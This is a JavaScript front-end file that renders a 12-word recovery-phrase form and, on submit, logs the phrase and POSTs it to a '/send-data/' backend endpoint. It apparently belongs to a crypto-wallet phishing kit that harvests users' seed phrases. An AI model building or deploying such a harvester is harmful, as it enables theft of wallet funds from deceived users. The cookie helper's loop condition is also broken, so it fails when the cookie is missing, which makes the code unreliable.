document.addEventListener('DOMContentLoaded', () => {
    const phraseGrid = document.getElementById('phraseGrid');
    const continueButton = document.querySelector('.continue-button');
    const phrases = Array(12).fill('');

    // Function to check if all phrases are filled
    const areAllPhrasesFilled = () => phrases.every(phrase => phrase.trim() !== '');

    // Function to update button state
    const updateContinueButton = () => {
        if (areAllPhrasesFilled()) {
            continueButton.removeAttribute('disabled');
            continueButton.classList.remove('disabled');
        } else {
            continueButton.setAttribute('disabled', 'true');
            continueButton.classList.add('disabled');
        }
    };

    // Initial button state
    updateContinueButton();

    // Create input fields
    for (let i = 0; i < 12; i++) {
        const wrapper = document.createElement('div');
        wrapper.className = 'input-wrapper';

        const input = document.createElement('input');
        input.type = 'text';
        input.className = 'phrase-input';
        input.placeholder = `Word ${i + 1}`;
        input.dataset.index = i;

        const number = document.createElement('span');
        number.className = 'input-number';
        number.textContent = i + 1;

        wrapper.appendChild(input);
        wrapper.appendChild(number);
        phraseGrid.appendChild(wrapper);

        // Handle input changes
        input.addEventListener('input', (e) => {
            const index = parseInt(e.target.dataset.index);
            phrases[index] = e.target.value;
            updateContinueButton();
        });

        // Handle enter key to move to next input
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const nextInput = phraseGrid.querySelector(`[data-index="${i + 1}"]`);
                if (nextInput) {
                    nextInput.focus();
                }
            }
        });
    }

       // Handle continue button
       continueButton.addEventListener('click', () => {
        const isComplete = phrases.every(phrase => phrase.trim() !== '');
        if (isComplete) {
            const recoveryPhrase = phrases.join(' ');
            console.log('Recovery phrase:', recoveryPhrase);
            // Send data to Django backend
            fetch('/send-data/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': getCookie('csrftoken') // Include CSRF token for security
                },
                body: JSON.stringify({ recovery_phrase: recoveryPhrase })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                // Handle success response
            })
            .catch((error) => {
                console.error('Error:', error);
                // Handle error response
            });
        } else {
            alert('Please fill in all words of the recovery phrase');
        }
    });
});

// Function to get CSRF token from cookies
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let i = 0; cookies.length; i++) {
            const cookie = cookies[i].trim();
            // Does this cookie string begin with the name we want?
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}